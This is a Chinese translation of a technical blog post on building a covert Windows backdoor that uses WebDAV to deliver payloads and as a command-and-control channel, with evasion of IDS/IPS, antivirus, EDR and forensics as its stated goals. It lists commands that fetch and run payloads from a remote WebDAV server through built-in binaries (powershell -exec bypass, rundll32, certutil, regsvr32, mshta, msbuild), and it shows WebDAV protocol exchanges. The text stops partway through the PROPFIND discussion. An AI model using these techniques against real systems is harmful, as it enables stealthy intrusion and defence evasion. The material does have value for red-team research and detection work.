# 【技术分享】利用WebDAV特性建立隐蔽后门
|
##### 译文声明
本文是翻译文章，文章来源：arno0x0x.wordpress.com
原文地址：
译文仅供参考，具体内容表达以及含义原文为准。
****
译者：[Ska](http://bobao.360.cn/member/contribute?uid=24753802)
预估稿费：200RMB
投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿
**前言——隐蔽后门的设计与需求**
我最近一直想为Windows系统设计一个隐蔽后门，主要功能是：
**传递各种恶意的payloads（shellcode，二进制文件，脚本等等…）**
**将其用作 C &C 通道**
为了取得成功，攻击者必须克服越来越多的挑战，特别是在企业环境中：  
**绕过IDS / IPS**
**绕过各种防护软件（桌面，代理，邮件网关等）**
**代理感知和代理友好**
**DFIR友好，这里指从攻击者的角度来看**
1\. 尝试使用被忽视的通信渠道
2\. 避免在磁盘上操作，或至少避免在以后无法擦除的位置写入信息
3\. 尽可能在内存中工作
**不要触发事件数据记录器** **：**
1\. MS-Office二进制文件或脚本引擎（powershell，script host）执行HTTP请求是很可疑的
2\. MS-Office二进制文件或脚本引擎（powershell，script host）在临时文件夹中写入某些类型的文件是很可疑的
**WebDAV** 协议具有许多有趣的特性，恰巧满足这些需求：
**Windows操作系统内置支持此协议**
**许多内置的API函数，以及使用这些API的二进制文件和命令行工具，支持UNC（通用命名约定）路径。** 这有几个优点：
1\.
您不需要注意实现网络通信部分（没有使用任何“常用”的网络对象：Microsoft.XMLHTTP，WinHttp.WinHttpRequest，System.Net.WebClient）
2\. 它将看起来像操作系统正在执行网络请求。
更确切地说，正在使用WebClient服务，因此我们可以看到连接到WebDAV服务器的svchost.exe进程，而不是powershell.exe，cscript.exe，regsvr32.exe或任何MS-Office二进制文件
3\. 它是代理感知和代理友好的，如果需要，它可以使用代理身份验证
**它可以传递代理（而不是一些纯TCP或UDP回调通道）**
**  
**
**Windows UNC路径处理挖掘**
为了实验WebDAV，我首先使用一个简单的 **Docker映像** 建立一个WebDAV服务器：
    docker pull visity / webdav
Windows操作系统通过 **WebClient** 服务为WebDAV协议提供支持。 必须首先启动此服务，以便命令行工具和Windows
API功能可以支持指向WebDAV服务器的UNC路径。
有趣的是，我发现如果WebClient服务没有启动，那么标准用户（即：没有管理员权限）不能通过常规方式启动它（services.msc或sc start
webclient），但是使用 pushd \ webdav.server.com 命令映射WebDAV共享上的虚拟驱动器即使从普通用户也将自动启动服务。
[](https://camo.githubusercontent.com/90c93f0c15466e0fef4926736d2c4101bb18137b/68747470733a2f2f646c2e64726f70626f7875736572636f6e74656e742e636f6d2f732f65616562716379766e73626c71336e2f7765626461765f30302e6a70673f646c3d30)  
一旦启动了WebClient服务，我们就可以开始用一些我们最喜爱的命令行工具来查看他们是否支持UNC指向我们的WebDAV服务器。
这是我同时在Windows 7和Windows 10上进行测试的结果：
成功的命令：
    powershell.exe -exec bypass -f \webdav.server.compayload.ps1
    rundll32.exe \webdav.server.compayload.dll,entryPoint
    certutil.exe -decode \webdav.server.compayload.b64 payload.dll
成功的API调用：
    VBA: Dir("\webdav.server.comsomepath")
    .Net: Directory.EnumerateFiles("\webdav.server.comsomepath")
失败的命令：
    regsvr32.exe /s /n /u /i:\webdav.server.compayload.sct scrobj.dll
    C:WindowsMicrosoft.NETFrameworkv4.0.30319msbuild.exe \webdav.server.compayload.xml
    copy \webdav.server.compayload payload
    xcopy \webdav.server.compayload payload
    mshta \webdav.server.compayload.hta
    C:WindowsMicrosoft.NETFrameworkv4.0.30319csc.exe /out:payload.exe \webdav.server.compayload.cs
这些失败的命令看上去与我想的不一致，因为在一些情况下，操作系统似乎能够通过远程文件系统访问文件（通过WebClient服务通过WebDAV协议）提供某种抽象层，
而在其他一些情况下，它却不行…这其中一定有一个原因，但我找不到为什么。
**  
**
**利弊**
到目前为止，使用指向WebDAV服务器的UNC路径证明具有以下优点：
1\. 为了提供一些（初始）Payloads，不需要实现网络通信部分。
这不仅是方便的，同时也可能避免被著名的"System.Net.WebClient().DownloadString() powershell技巧检测到。
2\. Svchost.exe是执行网络通信的唯一过程（EDR友好）
3\. 自动代理意识（包括认证），这在企业环境中是一个明确的“必须”。
然而，还有一些缺点：
1\.
通过上述命令中所示的UNC路径访问/下载的所有有效载荷都会在WedDAV客户端缓存（C:WindowsServiceProfilesLocalServiceAppDataLocalTempTfsStoreTfs_DAV）中本地复制。
这绝对不是对DFIR友好，因为它在磁盘上写，就可能会触发本地防病毒软件。
[](https://camo.githubusercontent.com/9efeb62cafb9953f6c13e02c39ea3856963a3d53/68747470733a2f2f646c2e64726f70626f7875736572636f6e74656e742e636f6d2f732f67726c673561676c727a38727278662f7765626461765f30312e706e673f646c3d30)
2\. 恶意的Payloads仍然会被诸如 **IPS** 之类的外围安全系统阻止，或更有可能被Web代理防病毒软件阻止。
那么我们如何摆脱这些缺陷，并以一种聪明的方式使用WebDAV作为提供Payloads的隐蔽通道呢？
**  
**
**一些WebDAV内部组件 – OPTIONS / PROPFIND / GET**
请记住，WebDAV只是HTTP协议的扩展，使用自己的一组HTTP动词（例如：PROPFIND，MKCOL，MOVE，LOCK等）和HTTP头（Depth，translate等），使用XML作为元数据传输的数据格式。
因此，当WebClient服务（即：WebDAV客户端）首先连接到WebDAV服务器时，它将通过执行以下请求来询问支持的选项：
    OPTIONS / HTTP/1.1
    Connection: Keep-Alive
    User-Agent: Microsoft-WebDAV-MiniRedir/10.0.14393
    translate: f
    Host: 10.211.55.2
WebDAV服务器通常将通过以下响应进行回应，详细说明其实现支持的所有选项：
    HTTP/1.1 200 OK
    Server: nginx/1.6.2
    Date: Thu, 07 Sep 2017 10:15:36 GMT
    Content-Length: 0
    DAV: 1
    Allow: GET,HEAD,PUT,DELETE,MKCOL,COPY,MOVE,PROPFIND,OPTIONS
    Proxy-Connection: Close
    Connection: Close
    Age: 0
那么通常会使用一些标题为“Depth:
0”的PROPFIND请求，以便WebDAV客户端获取有关它所在位置的信息（目录，大小，创建日期和其他类型的元数据）以及某些默认的Windows文件作为“Desktop.ini”或“Autorun.inf”（无论这些文件是否存在于WebDAV服务器上）。